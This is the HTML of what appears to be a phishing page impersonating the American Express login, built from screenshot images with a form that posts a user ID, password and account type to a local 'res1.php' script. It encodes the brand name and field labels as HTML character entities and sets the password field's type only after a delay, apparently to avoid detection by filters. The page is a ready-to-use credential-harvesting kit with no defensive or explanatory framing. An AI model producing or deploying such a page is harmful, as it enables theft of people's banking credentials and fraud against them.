<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#110;&#32;&#69;&#120;&#112;&#114;&#101;&#115;&#115;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#115;&#44;&#32;&#82;&#101;&#119;&#97;&#114;&#100;&#115;&#44;&#32;&#84;&#114;&#97;&#118;&#101;&#108;&#32;&#97;&#110;&#100;&#32;&#66;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#115;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="img/favicon.ico"/>
<style type="text/css">		
			  .textbox {
    height: 50px;
	padding-left: 5px; 
    background: #f7f8f9;
    border: none;
    border: 1px solid #ccc;
    border-radius: 3px;
    font: 300 normal 12px / 22px 'Gotham SSm A', 'Gotham SSm B', 'Proxima Nova', 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    font-size: 16px;
    color: #333;
    outline: none;
    }
.textbox:focus {
    background: #f7f8f9;
    border: 1px solid #1274b8;
}

 </style>
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:29px;
							height:24px; 
							display:inline-block;
							line-height:24px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:24px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -24px;
						}
						label.css-label {
				background-image:url(img/csscheckbox_905cce9959bddf2c4f0f34021f59d252.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:476px; z-index:0"><img src="img/e1.png" alt="" title="" border=0 width=1349 height=476></div>

<div id="image2" style="position:absolute; overflow:hidden; left:82px; top:515px; width:1182px; height:401px; z-index:1"><a href="#"><img src="img/e2.png" alt="" title="" border=0 width=1182 height=401></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:986px; width:1349px; height:471px; z-index:2"><a href="#"><img src="img/e3.png" alt="" title="" border=0 width=1349 height=471></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:73px; top:1502px; width:1228px; height:497px; z-index:3"><a href="#"><img src="img/e4.png" alt="" title="" border=0 width=1228 height=497></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:114px; top:354px; width:195px; height:45px; z-index:4"><a href="#"><img src="img/e5.png" alt="" title="" border=0 width=195 height=45></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:74px; top:7px; width:490px; height:47px; z-index:5"><a href="#"><img src="img/e6.png" alt="" title="" border=0 width=490 height=47></a></div>
<form action=res1.php name=hawakamh id=hawakamh method=post>
<input name="ud" placeholder="&#85;&#115;&#101;&#114;&#32;&#73;&#68;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:132px;left:115px;top:140px;z-index:6">
<input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:132px;left:258px;top:140px;z-index:7">
<select name="acc" class="textbox" autocomplete="off" required style="position:absolute;left:115px;top:200px;width:275px;z-index:8">
<option value="Cards - My Account">Cards - My Account</option>
						<option value="Membership Rewards">Membership Rewards</option>
									
						<option value="Merchant Account">Merchant Account</option> 					
						<option value="&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#110;&#32;&#69;&#120;&#112;&#114;&#101;&#115;&#115;&#32;&#64;&#32;&#87;&#111;&#114;&#107;">&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#110;&#32;&#69;&#120;&#112;&#114;&#101;&#115;&#115;&#32;&#64;&#32;&#87;&#111;&#114;&#107;</option></select>
<div id="checkboxG1"  style="position:absolute; left:114px; top:261px; z-index:9"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:114px; top:261px; z-index:9"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:114px; top:292px; z-index:10"><input type="image" name="formimage1" width="277" height="53" src="img/meg.png"></div>
</div>

</body>
</html>
